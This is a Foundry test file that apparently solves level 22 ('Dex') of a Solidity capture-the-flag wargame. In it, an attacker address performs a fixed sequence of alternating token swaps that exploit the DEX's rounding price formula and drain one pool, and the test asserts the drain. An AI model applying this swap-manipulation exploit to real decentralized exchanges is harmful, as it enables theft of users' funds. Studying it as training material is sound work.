// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/22_Dex.sol";

contract DexTest is Test {
    Dex dex;
    SwappableToken token1;
    SwappableToken token2;
    address hacker = address(0x1337);

    function setUp() public {
        dex = new Dex();

        token1 = new SwappableToken(address(dex), "Token 1", "TKN1", 110);
        token2 = new SwappableToken(address(dex), "Token 2", "TKN2", 110);

        dex.setTokens(address(token1), address(token2));

        token1.transfer(hacker, 10);
        token2.transfer(hacker, 10);

        token1.approve(address(dex), 100);
        token2.approve(address(dex), 100);

        dex.addLiquidity(address(token1), 100);
        dex.addLiquidity(address(token2), 100);

        vm.deal(hacker, 1 ether);
    }

    function testExploit() public {
        vm.startPrank(hacker);
        dex.approve(address(dex), type(uint256).max);
        dex.swap(address(token1), address(token2), 10);
        dex.swap(address(token2), address(token1), 20);
        dex.swap(address(token1), address(token2), 24);
        dex.swap(address(token2), address(token1), 30);
        dex.swap(address(token1), address(token2), 41);
        dex.swap(address(token2), address(token1), 45);
        vm.stopPrank();

        bool dexDrained = token1.balanceOf(address(dex)) == 0 || token2.balanceOf(address(dex)) == 0;
        assertTrue(dexDrained);
    }
}